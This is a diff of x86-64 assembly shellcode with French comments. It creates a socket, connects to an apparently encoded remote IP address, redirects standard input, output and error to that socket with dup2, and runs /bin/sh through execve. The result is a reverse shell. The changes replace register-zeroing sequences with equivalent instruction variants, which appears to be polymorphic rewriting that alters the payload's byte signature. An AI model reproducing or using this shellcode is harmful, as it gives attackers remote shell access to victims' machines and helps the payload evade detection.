@@ -9,15 +9,16 @@ _start:
 
     ;création du sys_socket 41
     ; int socket(int domain, int type, int protocol);
-push 0xFF 
-pop rdi 
-sub rdi 0xFF 
-push 0xFF 
-pop rsi 
-sub rsi 0xFF 
-xor rdx, rdx
+
+mov rdi, 0x01 
+dec rdi
+xor rsi, rsi
+
+mov rdx, 0x01 
+dec rdx
+
 mov rax, 0xFF 
-sub rax 0xFF
+sub rax, 0xFF
 
     ;param1
     mov dil, 0x2        ;famille du socket
@@ -32,27 +33,31 @@ sub rax 0xFF
     syscall
 
 
+push r11
 push rax
-pop r12
+pop r11
+mov r12, r11
+pop r11
     ;création du sys_connect 42
 
     ;param1
 
-push r8
-mov r8, r12
-mov rdi,r8
-pop r8
+push rbx
+mov rbx, r12
+mov rdi, rbx
+pop rbx
 
-push r11
-xor r11,r11 
-mov rsi,r11 
-pop r11
-push r11
-xor r11,r11 
-mov rdx,r11 
-pop r11
-mov rax, 0xFF 
-sub rax 0xFF
+
+push r12
+xor r12, r12 
+mov rsi,r12 
+pop r12
+
+mov rdx, 0x01 
+dec rdx
+
+mov rax, 0x01 
+dec rax
 
     ;param2
     mov esi, 0xffffffff ;création de l'adresse ip
@@ -73,14 +78,20 @@ sub rax 0xFF
     ;paramétrage sys_dup2
 
     ;sortie0
-push 0xFF 
-pop rsi 
-sub rsi 0xFF 
-mov rax, 0xFF 
-sub rax 0xFF
 
 push r12
-pop rdi
+xor r12, r12 
+mov rsi,r12 
+pop r12
+
+push 0xFF 
+pop rax 
+sub rax, 0xFF 
+
+push r10
+mov r10, r12
+mov rdi, r10
+pop r10
     mov sil, 0xFF   ;redirection sortie 0 vers rdi (stream)
     sub sil, 0xFF
 
@@ -88,11 +99,14 @@ pop rdi
     syscall
 
     ;sortie1
-mov rsi, 0xFF 
-sub rsi 0xFF
-xor rax, rax
+xor rsi, rsi
 
-mov rdi, r12
+mov rax, 0x01 
+dec rax
+
+
+push r12
+pop rdi
     mov sil, 0x1   ;redirection sortie 1 vers rdi (stream)
 
 
@@ -100,14 +114,14 @@ mov rdi, r12
     syscall
 
     ;sortie2
-push r10
-xor r10,r10 
-mov rsi,r10 
-pop r10
-mov rax, 0xFF 
-sub rax 0xFF
+xor rsi, rsi
 
-mov rdi, r12
+mov rax, 0xFF 
+sub rax, 0xFF
+
+
+push r12
+pop rdi
     mov sil, 0x2   ;redirection sortie 2 vers rdi (stream)
 
     mov al, 33
@@ -117,21 +131,18 @@ mov rdi, r12
     ; 59 opcode
     ; int execve(char *fname, char **argp, char **envp);
     xor eax, eax
-push rdx
-xor rdx,rdx 
-mov rdi,rdx 
-pop rdx
-push rsi
-xor rsi,rsi 
-mov rdx,rsi 
-pop rsi
-mov rsi, 0x01 
-dec rsi
 
-push rsi
-mov rsi, 0x68732f6e69622f2f
-mov rdi,rsi
-pop rsi
+push 0xFF 
+pop rdi 
+sub rdi, 0xFF 
+
+mov rdx, 0x01 
+dec rdx
+
+push 0xFF 
+pop rsi 
+sub rsi, 0xFF 
+mov rdi, 0x68732f6e69622f2f
     push rdx            ; délimiteur de stack à 0
     push rdi            ; insertion chaine /bin/sh en stack
     mov rdi, rsp        ; insertion du pointeur de stack dans rdi
